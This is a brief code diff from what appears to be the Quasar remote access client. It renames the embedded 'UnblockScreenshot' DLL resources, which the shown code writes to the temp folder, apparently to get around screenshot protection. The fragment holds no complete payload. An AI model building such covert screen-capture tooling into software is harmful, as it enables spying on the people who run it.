@@ -105,7 +105,7 @@ namespace Quasar.Client.Helper
             }
             if (isWow64)
             {
-                byte[] realUnblockScreenshotx86 = Resource1.UnblockScreenshot_ChildWindow_x86;
+                byte[] realUnblockScreenshotx86 = Resource1.UnblockScreenshot_x86;
                 dllPath = Path.Combine(new string[]
                 {
                         Path.GetTempPath(),
@@ -123,7 +123,7 @@ namespace Quasar.Client.Helper
             }
             else
             {
-                byte[] realUnblockScreenshotx64 = Resource1.UnblockScreenshot_ChildWindow_x64;
+                byte[] realUnblockScreenshotx64 = Resource1.UnblockScreenshot_x64;
                 dllPath = Path.Combine(new string[]
                 {
                         Path.GetTempPath(),
